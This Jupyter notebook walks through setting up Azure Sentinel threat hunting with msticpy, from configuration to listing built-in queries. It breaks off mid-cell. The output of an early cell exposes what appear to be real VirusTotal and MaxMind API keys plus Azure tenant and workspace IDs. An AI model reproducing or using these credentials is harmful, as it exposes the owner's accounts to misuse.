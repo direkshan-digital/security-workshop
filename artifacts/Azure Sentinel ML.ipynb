{
  "cells": [
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "# Getting Started with Azure ML Notebooks and Azure Sentinel\n**Notebook Version:** 1.0<br>\n **Python Version:** Python 3.6 (including Python 3.6 - AzureML)<br>\n **Required Packages**: <br>\n **Platforms Supported**:\n - Azure Notebooks Free Compute\n - Azure Notebooks DSVM\n - OS Independent\n\n**Data Sources Required**:\n - Log Analytics - SiginLogs (Optional)\n - VirusTotal\n - MaxMind\n \n \nThis notebook takes you through the basics needed to get started with Azure Notebooks and Azure Sentinel, and how to perform the basic actions of data acquisition, data enrichment, data analysis, and data visualization. These actions are the building blocks of threat hunting with notebooks and are useful to understand before running more complex notebooks. This notebook only lightly covers each topic but includes 'learn more' sections to provide you with the resource to deep dive into each of these topics. \n\nThis notebook assumes that you are running this in an Azure Notebooks environment, however it will work in other Jupyter environments.\n\n**Note:**\nThis notebooks uses SigninLogs from your Azure Sentinel Workspace. If you are not yet collecting SigninLogs configure this connector in the Azure Sentinel portal before running this notebook.\nThis notebook also uses the VirusTotal API for data enrichment, for this you will require an API key which can be obtained by signing up for a free [VirusTotal community account](https://www.virustotal.com/gui/join-us)\n"
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "---\n## Setting up the environment\nCode cells behave in the same way your code would in other environments, so you need to remember about common coding practices such as variable initialization and library imports. \nBefore we execute more complex code we need to make sure the required packages are installed and libraries imported. At the top of many of the Azure Sentinel notebooks you will see large cells that will check kernel versions and then install and import all the libraries we are going to be using in the notebook, make sure you run this before running other cells in the notebook.\nIf you are running notebooks locally or via dedicated compute in Azure Notebooks library installs will persist but this is not the case with Azure Notebooks free tier, so you will need to install each time you run. Even if running in a static environment imports are required for each run so make sure you run this cell regardless."
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "---\n## Configuration\nOnce we have set up our Jupyter environment with the libraries that we'll use in the notebook, we need to make sure we have some configuration in place. Some of the notebook components need addtional configuration to connect to external services (e.g. API keys to retrieve Threat Intelligence data). This includes configuration for connection to our Azure Sentinel workspace, as well as some threat intelligence providers we will use later.\nThe easiest way to handle the configuration for these services is to store them in a msticpyconfig file (`msticpyconfig.yaml`). More details on msticpyconfig can be found here: https://msticpy.readthedocs.io/en/latest/getting_started/msticpyconfig.html\n"
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "The cell below will setup a msticpyconfig.yaml file. If your config file does not contain details under Azure Sentinel > Workspaces, or TIProviders the following cells will populate these for you.<br>"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "!pip install -U PyYAML\n\nimport yaml\ndef print_config():\n    with open('msticpyconfig.yaml') as f:\n        data = yaml.load(f)\n        print(yaml.dump(data))\ntry:\n    print_config()\nexcept FileNotFoundError:\n    print(\"No msticpyconfig.yaml was found in your current directory.\")\n    print(\"We are downloading a template file for you.\")\n    urlretrieve(\"https://raw.githubusercontent.com/Azure/Azure-Sentinel-Notebooks/master/msticpyconfig.yaml\", \"msticpyconfig.yaml\")\n    print_config()",
      "execution_count": 13,
      "outputs": [
        {
          "output_type": "stream",
          "text": "Processing /home/nbuser/.cache/pip/wheels/e5/9d/ad/2ee53cf262cba1ffd8afe1487eef788ea3f260b7e6232a80fc/PyYAML-5.3.1-cp36-cp36m-linux_x86_64.whl\nInstalling collected packages: PyYAML\n  Attempting uninstall: PyYAML\n    Found existing installation: PyYAML 3.13\n\u001b[31mERROR: Cannot uninstall 'PyYAML'. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.\u001b[0m\nAzureSentinel:\n  Workspaces:\n    Default: {TenantId: 3a4b264d-17b4-4abb-98bd-0728f39406fb, WorkspaceId: 702d006b-1665-4c2c-a1b2-afa81601aff3}\nOtherProviders:\n  GeoIPLite:\n    Args: {AuthKey: eSlBGugmCO8PYnW4, DBFolder: ~/msticpy}\n    Provider: GeoLiteLookup\nQueryDefinitions: null\nTIProviders:\n  VirusTotal:\n    Args: {AuthKey: b3f5f6712371570e2d725bdd2c16451c3c9f80e6ccad71c5400f7d8e3957e3e1}\n    Primary: true\n    Provider: VirusTotal\n\n",
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "from pathlib import Path\nimport os\nimport sys\nimport warnings\nfrom IPython.display import display, HTML, Markdown\n\nREQ_PYTHON_VER=(3, 6)\nREQ_MSTICPY_VER=(0, 6, 0)\n\ndisplay(HTML(\"<h3>Starting Notebook setup...</h3>\"))\n# If you did not clone the entire Azure-Sentinel-Notebooks repo you may not have this file\nif Path(\"./utils/nb_check.py\").is_file():\n    from utils.nb_check import check_python_ver, check_mp_ver\n\n    check_python_ver(min_py_ver=REQ_PYTHON_VER)\n    try:\n        check_mp_ver(min_msticpy_ver=REQ_MSTICPY_VER)\n    except ImportError:\n        !pip install --upgrade msticpy\n        if \"msticpy\" in sys.modules:\n            importlib.reload(sys.modules[\"msticpy\"])\n        else:\n            import msticpy\n        check_mp_ver(REQ_MSTICPY_VER)\n            \nfrom msticpy.nbtools import nbinit\nnbinit.init_notebook(\n    namespace=globals(),\n    extra_imports=[\"ipwhois, IPWhois\", \"urllib.request, urlretrieve\", \"yaml\"]\n)",
      "execution_count": 14,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<h3>Starting Notebook setup...</h3>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "Checking Python kernel version...",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "Python kernel version 3.6.6 OK",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "Checking msticpy version...",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "msticpy version 0.7.1 OK",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "text": "Processing imports....\nChecking configuration....\nNo errors found.\n\nThe following configuration warnings were found: \n -------------------------------------------------\nNo AzureCLI section in settings.\nSetting options....\n",
          "name": "stdout"
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<h3>Notebook setup complete</h3>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "execution_count": 14,
          "data": {
            "text/plain": "True"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "If you do not have an msticpyconfig file we can populate one for you. Before you do this you will need a few things.\n\nThe first is the Workspace ID and Tenant ID of the Azure Sentinel Workspace you wish to connect to.\n\n - You can get the workspace ID by opening Azure Sentinel in the [Azure Portal](https://portal.azure.com) and selecting Settings > Workspace Settings. Your Workspace ID is displayed near the top of this page.\n\n- You can get your tenant ID (also referred to organization or directory ID) via [Azure Active Directory](https://docs.microsoft.com/en-us/onedrive/find-your-office-365-tenant-id)\n\nWe are going to use [VirusTotal](https://www.virustotal.com) to enrich our Azure Sentinel data. For this you will need a VirusTotal API key, one of these can be obtained for free (as a personnal key) via the [VirusTotal](https://developers.virustotal.com/v3.0/reference#getting-started) website.\nWe are using VirusTotal for this notebook but we also support a range of other threat intelligence providers: https://msticpy.readthedocs.io/en/latest/data_acquisition/TIProviders.html\n<br><br>\nIn addition we are going to plot IP address locations on a map, in order to do this we are going to use [MaxMind](https://www.maxmind.com) to geolocate IP addresses which requires an API key. You can sign up for a free account and API key at https://www.maxmind.com/en/geolite2/signup. \n<br><br>\nOnce you have these required items run the cell below and you will prompted to enter these elements:"
    },
    {
      "metadata": {
        "scrolled": true,
        "trusted": true
      },
      "cell_type": "code",
      "source": "ws_id = nbwidgets.GetEnvironmentKey(env_var='WORKSPACE_ID',\n                                        prompt='Please enter your Log Analytics Workspace Id:', auto_display=True)\nten_id = nbwidgets.GetEnvironmentKey(env_var='TENANT_ID',\n                                         prompt='Please enter your Log Analytics Tenant Id:', auto_display=True)\nvt_key = nbwidgets.GetEnvironmentKey(env_var='VT_KEY',\n                                        prompt='Please enter your VirusTotal API Key:', auto_display=True)\nmm_key = nbwidgets.GetEnvironmentKey(env_var='MM_KEY',\n                                        prompt='Please enter your MaxMind API Key:', auto_display=True)",
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "1457f11d9edc467e87977f57396d2155",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": "HTML(value='')"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "4ee2fa314f044f6ab285f49ef8c451ec",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": "HBox(children=(Text(value='', description='Please enter your Log Analytics Workspace Id:', layout=Layout(width…"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "d1dfc5d00b514958a3aed5048f1e4002",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": "HTML(value='')"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "31fe373357804ed89f6ce59b14c2b30a",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": "HBox(children=(Text(value='', description='Please enter your Log Analytics Tenant Id:', layout=Layout(width='5…"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "94e2de111a5b467e8a7468eca40b9b39",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": "HTML(value='')"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "edaea60af31745eeb1d7605b5f5e59e3",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": "HBox(children=(Text(value='', description='Please enter your VirusTotal API Key:', layout=Layout(width='50%'),…"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "214132f60dc049389aaeffe53a9d94aa",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": "HTML(value='')"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "9fb022f62a094f1b960df991c255b0bc",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": "HBox(children=(Text(value='', description='Please enter your MaxMind API Key:', layout=Layout(width='50%'), st…"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": " The cell below will now populate a msticpyconfig file with these values:"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "with open(\"msticpyconfig.yaml\") as config:\n    data = yaml.load(config, Loader=yaml.Loader)\ndata['AzureSentinel']\n\nworkspace = {\"Default\":{\"WorkspaceId\": ws_id.value, \"TenantId\": ten_id.value}}\nti = {\"VirusTotal\":{\"Args\": {\"AuthKey\" : vt_key.value}, \"Primary\" : True, \"Provider\": \"VirusTotal\"}}\nother_prov = {\"GeoIPLite\" : {\"Args\" : {\"AuthKey\" : mm_key.value, \"DBFolder\" : \"~/msticpy\"}, \"Provider\" : \"GeoLiteLookup\"}}\ndata['AzureSentinel']['Workspaces'] = workspace\ndata['TIProviders'] = ti\ndata['OtherProviders'] = other_prov\n\nwith open(\"msticpyconfig.yaml\", 'w') as config:\n    yaml.dump(data, config)\n    \nprint(\"msticpyconfig.yaml updated\")",
      "execution_count": 15,
      "outputs": [
        {
          "output_type": "stream",
          "text": "msticpyconfig.yaml updated\n",
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "We can now validate our configuration is correct."
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "from msticpy.common.pkg_config import refresh_config, validate_config\nrefresh_config()\nvalidate_config()",
      "execution_count": 16,
      "outputs": [
        {
          "output_type": "stream",
          "text": "No errors found.\n\nThe following configuration warnings were found: \n -------------------------------------------------\nNo AzureCLI section in settings.\n",
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "execution_count": 16,
          "data": {
            "text/plain": "([], ['No AzureCLI section in settings.'])"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "> **Note** you may see warnings for missing providers when running this cell.\n> This is not an issue as we will not be using all providers in this notebook\n> so long as you get thie message \"No errors found.\" you are OK to proceed.\n"
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "---\n## Getting Data\nNow that we have configured the details necessary to connect to Azure Sentinel we can go ahead and get some data. We will do this with `QueryProvider()` from MSTICpy. \nYou can use the `QueryProvider` class to connect to different data sources such as MDATP, the Security Graph API, and the one we will use here, Azure Sentinel. \n\n### Learn more:\n - More details on configuring and using QueryProviders can be found in the [MSTICpy Documentation](https://msticpy.readthedocs.io/en/latest/data_acquisition/DataProviders.html#instantiating-a-query-provider).\n<br><br>"
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "For now, we are going to set up a QueryProvider for Azure Sentinel, pass it the details for our workspace that we just stored in the msticpyconfig file, and connect. \n\nThe connection process will ask us to authenticate to our Azure Sentinel workspace via [device authorization](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) with our Azure credentials. \n\nYou can do this by clicking the device login code button that appears as the output of the next cell, or by navigating to https://microsoft.com/devicelogin and manually entering the code. \n\nNote that this authentication persists with the kernel you are using with the notebook, so if you restart the kernel you will need to re-authenticate.\n"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "# Initalize a QueryProvider for Azure Sentinel\nqry_prov = QueryProvider(\"LogAnalytics\")\n\n# Get the Azure Sentinel workspace details from msticpyconfig\ntry:\n    ws_config = WorkspaceConfig()\n    md(\"Workspace details collected from config file\")\nexcept:\n    raise Exception(\"No workspace settings are configured, please run the cells above to configure these.\")\n    \n# Connect to Azure Sentinel with our QueryProvider and config details\n# ws_config.code_connect_str is a feature of MSTICpy that creates the required connection string from details in our msticpyconfig\nqry_prov.connect(connection_str=ws_config.code_connect_str)",
      "execution_count": 17,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<!DOCTYPE html>\n                    <html><body><script>\n\n                        // close authentication window\n                        if (kql_MagicUserCodeAuthWindow && kql_MagicUserCodeAuthWindow.opener != null && !kql_MagicUserCodeAuthWindow.closed) {\n                            kql_MagicUserCodeAuthWindow.close()\n                        }\n                        // TODO: make sure, you clear the right cell. BTW, not sure it is a must to do any clearing\n\n                        // clear output cell\n                        Jupyter.notebook.clear_output(Jupyter.notebook.get_selected_index())\n\n                        // TODO: if in run all mode, move to last cell, otherwise move to next cell\n                        // move to next cell\n\n                    </script></body></html>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<!DOCTYPE html>\n            <html><body>\n            <div style=''>\n            \n\n            <button onclick=\"this.style.visibility='visible';kql_MagicLaunchWindowFunction('Kqlmagic_temp_files/_702d006b-1665-4c2c-a1b2-afa81601aff3_at_loganalytics_schema.html','fullscreen=no,directories=no,location=no,menubar=no,resizable=yes,scrollbars=yes,status=no,titlebar=no,toolbar=no,','_702d006b_1665_4c2c_a1b2_afa81601aff3_at_loganalytics_schema','https://notebooks.azure.com')\">popup schema 702d006b-1665-4c2c-a1b2-afa81601aff3@loganalytics</button>\n            \n            </div>\n\n            <script>\n\n            function kql_MagicLaunchWindowFunction(file_path, window_params, window_name, notebooks_host) {\n                var url;\n                if (notebooks_host == 'text') {\n                    url = ''\n                } else if (file_path.startsWith('http')) {\n                    url = file_path;\n                } else {\n                    var base_url = '';\n\n                    // check if azure notebook\n                    var azure_host = (notebooks_host == null || notebooks_host.length == 0) ? 'https://notebooks.azure.com' : notebooks_host;\n                    var start = azure_host.search('//');\n                    var azure_host_suffix = '.' + azure_host.substring(start+2);\n\n                    var loc = String(window.location);\n                    var end = loc.search(azure_host_suffix);\n                    start = loc.search('//');\n                    if (start > 0 && end > 0) {\n                        var parts = loc.substring(start+2, end).split('-');\n                        if (parts.length == 2) {\n                            var library = parts[0];\n                            var user = parts[1];\n                            base_url = azure_host + '/api/user/' +user+ '/library/' +library+ '/html/';\n                        }\n                    }\n\n                    // check if local jupyter lab\n                    if (base_url.length == 0) {\n                        var configDataScipt  = document.getElementById('jupyter-config-data');\n                        if (configDataScipt != null) {\n                            var jupyterConfigData = JSON.parse(configDataScipt.textContent);\n                            if (jupyterConfigData['appName'] == 'JupyterLab' && jupyterConfigData['serverRoot'] != null &&  jupyterConfigData['treeUrl'] != null) {\n                                var basePath = '/home/nbuser/library' + '/';\n                                if (basePath.startsWith(jupyterConfigData['serverRoot'])) {\n                                    base_url = '/files/' + basePath.substring(jupyterConfigData['serverRoot'].length+1);\n                                }\n                            } \n                        }\n                    }\n\n                    // assume local jupyter notebook\n                    if (base_url.length == 0) {\n\n                        var parts = loc.split('/');\n                        parts.pop();\n                        base_url = parts.join('/') + '/';\n                    }\n                    url = base_url + file_path;\n                }\n\n                window.focus();\n                var w = screen.width / 2;\n                var h = screen.height / 2;\n                params = 'width='+w+',height='+h;\n                kql_Magic__702d006b_1665_4c2c_a1b2_afa81601aff3_at_loganalytics_schema = window.open(url, window_name, window_params + params);\n                if (url == '') {\n                    var el = kql_Magic__702d006b_1665_4c2c_a1b2_afa81601aff3_at_loganalytics_schema.document.createElement('p');\n                    kql_Magic__702d006b_1665_4c2c_a1b2_afa81601aff3_at_loganalytics_schema.document.body.overflow = 'auto';\n                    el.style.top = 0;\n                    el.style.left = 0;\n                    el.innerHTML = file_path;\n                    kql_Magic__702d006b_1665_4c2c_a1b2_afa81601aff3_at_loganalytics_schema.document.body.appendChild(el);\n                }\n            }\n            </script>\n\n            </body></html>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "Now that we have connected we can query Azure Sentinel for data, but before we do that we need to understand what data is avalaible to query. The QueryProvider object provides a way to get a list of tables as well as tables and table columns:"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "# Get list of tables in our Workspace\ndisplay(qry_prov.schema_tables [:5]) # We are outputting only the first 5 tables for brevity\n# Get list of tables and thier columns\nqry_prov.schema['SigninLogs'] # We are only displaying the columns for SigninLogs for brevity",
      "execution_count": 18,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "['AADDomainServicesAccountLogon',\n 'AADDomainServicesAccountManagement',\n 'AADDomainServicesDirectoryServiceAccess',\n 'AADDomainServicesLogonLogoff',\n 'AADDomainServicesPolicyChange']"
          },
          "metadata": {}
        },
        {
          "output_type": "execute_result",
          "execution_count": 18,
          "data": {
            "text/plain": "{\n    \u001b[34;01m\"AADTenantId\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"AlternateSignInName\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"AppDisplayName\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"AppId\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"AuthenticationDetails\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"AuthenticationMethodsUsed\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"AuthenticationProcessingDetails\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"AuthenticationRequirement\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"AuthenticationRequirementPolicies\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"Category\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ClientAppUsed\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ConditionalAccessPolicies\"\u001b[39;49;00m: \u001b[33m\"dynamic\"\u001b[39;49;00m,\n    \u001b[34;01m\"ConditionalAccessStatus\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"CorrelationId\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"CreatedDateTime\"\u001b[39;49;00m: \u001b[33m\"datetime\"\u001b[39;49;00m,\n    \u001b[34;01m\"DeviceDetail\"\u001b[39;49;00m: \u001b[33m\"dynamic\"\u001b[39;49;00m,\n    \u001b[34;01m\"DurationMs\"\u001b[39;49;00m: \u001b[33m\"long\"\u001b[39;49;00m,\n    \u001b[34;01m\"IPAddress\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"Id\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"Identity\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"IsInteractive\"\u001b[39;49;00m: \u001b[33m\"bool\"\u001b[39;49;00m,\n    \u001b[34;01m\"IsRisky\"\u001b[39;49;00m: \u001b[33m\"bool\"\u001b[39;49;00m,\n    \u001b[34;01m\"Level\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"Location\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"LocationDetails\"\u001b[39;49;00m: \u001b[33m\"dynamic\"\u001b[39;49;00m,\n    \u001b[34;01m\"MfaDetail\"\u001b[39;49;00m: \u001b[33m\"dynamic\"\u001b[39;49;00m,\n    \u001b[34;01m\"NetworkLocationDetails\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"OperationName\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"OperationVersion\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"OriginalRequestId\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ProcessingTimeInMilliseconds\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"Resource\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ResourceDisplayName\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ResourceGroup\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ResourceId\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ResourceIdentity\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ResourceProvider\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ResultDescription\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ResultSignature\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ResultType\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"RiskDetail\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"RiskEventTypes\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"RiskEventTypes_V2\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"RiskLevelAggregated\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"RiskLevelDuringSignIn\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"RiskState\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ServicePrincipalId\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"ServicePrincipalName\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"SourceSystem\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"Status\"\u001b[39;49;00m: \u001b[33m\"dynamic\"\u001b[39;49;00m,\n    \u001b[34;01m\"TimeGenerated\"\u001b[39;49;00m: \u001b[33m\"datetime\"\u001b[39;49;00m,\n    \u001b[34;01m\"TokenIssuerName\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"TokenIssuerType\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"Type\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"UserAgent\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"UserDisplayName\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"UserId\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m,\n    \u001b[34;01m\"UserPrincipalName\"\u001b[39;49;00m: \u001b[33m\"string\"\u001b[39;49;00m\n}"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "MSTICpy includes a number of built in queries that you can run.<br>\nYou can list available queries with .list_queries() and get specific details about a query by calling it with \"?\" as a parameter"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "# Get a list of avaliable queries\nqry_prov.list_queries()",
      "execution_count": 19,
      "outputs": [
        {
          "output_type": "execute_result",
          "execution_count": 19,
          "data": {
            "text/plain": "['Azure.list_aad_signins_for_account',\n 'Azure.list_aad_signins_for_ip',\n 'Azure.list_all_signins_geo',\n 'Azure.list_azure_activity_for_account',\n 'Azure.list_azure_activity_for_ip',\n 'Azure.list_azure_activity_for_resource',\n 'AzureNetwork.az_net_analytics',\n 'AzureSentinel.get_bookmark_by_id',\n 'AzureSentinel.get_bookmark_by_name',\n 'AzureSentinel.list_bookmarks',\n 'AzureSentinel.list_bookmarks_for_entity',\n 'AzureSentinel.list_bookmarks_for_tags',\n 'Heartbeat.get_info_by_hostname',\n 'Heartbeat.get_info_by_ipaddress',\n 'LinuxAudit.auditd_all',\n 'LinuxSyslog.all_syslog',\n 'LinuxSyslog.cron_activity',\n 'LinuxSyslog.list_host_logon_failures',\n 'LinuxSyslog.list_logon_failures',\n 'LinuxSyslog.list_logons_for_account',\n 'LinuxSyslog.list_logons_for_host',\n 'LinuxSyslog.list_logons_for_source_ip',\n 'LinuxSyslog.squid_activity',\n 'LinuxSyslog.sudo_activity',\n 'LinuxSyslog.user_group_activity',\n 'LinuxSyslog.user_logon',\n 'MultiDataSource.get_timeseries_anomalies',\n 'MultiDataSource.get_timeseries_data',\n 'MultiDataSource.get_timeseries_decompose',\n 'MultiDataSource.plot_timeseries_datawithbaseline',\n 'MultiDataSource.plot_timeseries_scoreanomolies',\n 'Network.get_heartbeat_for_host',\n 'Network.get_heartbeat_for_ip',\n 'Network.get_host_for_ip',\n 'Network.get_ips_for_host',\n 'Network.list_azure_network_flows_by_host',\n 'Network.list_azure_network_flows_by_ip',\n 'Office365.list_activity_for_account',\n 'Office365.list_activity_for_ip',\n 'Office365.list_azure_activity_for_resource',\n 'SecurityAlert.get_alert',\n 'SecurityAlert.list_alerts',\n 'SecurityAlert.list_alerts_counts',\n 'SecurityAlert.list_alerts_for_ip',\n 'SecurityAlert.list_related_alerts',\n 'ThreatIntelligence.list_indicators',\n 'ThreatIntelligence.list_indicators_by_domain',\n 'ThreatIntelligence.list_indicators_by_email',\n 'ThreatIntelligence.list_indicators_by_filepath',\n 'ThreatIntelligence.list_indicators_by_hash',\n 'ThreatIntelligence.list_indicators_by_ip',\n 'ThreatIntelligence.list_indicators_by_url',\n 'WindowsSecurity.get_host_logon',\n 'WindowsSecurity.get_parent_process',\n 'WindowsSecurity.get_process_tree',\n 'WindowsSecurity.list_all_logons_by_host',\n 'WindowsSecurity.list_events',\n 'WindowsSecurity.list_events_by_id',\n 'WindowsSecurity.list_host_events',\n 'WindowsSecurity.list_host_events_by_id',\n 'WindowsSecurity.list_host_logon_failures',\n 'WindowsSecurity.list_host_logons',\n 'WindowsSecurity.list_host_processes',\n 'WindowsSecurity.list_hosts_matching_commandline',\n 'WindowsSecurity.list_logon_attempts_by_account',\n 'WindowsSecurity.list_logon_failures_by_account',\n 'WindowsSecurity.list_logons_by_account',\n 'WindowsSecurity.list_matching_processes',\n 'WindowsSecurity.list_other_events',\n 'WindowsSecurity.list_processes_in_session']"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "# Get details about a query\nqry_prov.Azure.list_all_signins_geo(\"?\")",
      "execution_count": 20,
      "outputs": [
        {
